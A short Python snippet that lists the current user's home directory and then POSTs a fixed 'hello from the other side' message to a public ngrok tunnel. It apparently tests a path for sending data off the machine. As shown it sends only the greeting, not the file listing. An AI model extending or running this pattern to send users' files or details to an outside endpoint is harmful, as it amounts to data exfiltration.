import os, requests

# .replace(" ", "%20")

user = os.environ["USER"]
os.listdir(f"/home/{user}/")

url = "https://37fb24483abd.ngrok-free.app/log"
data = {"msg": "hello from the other side"}

response = requests.post(url, data=data)
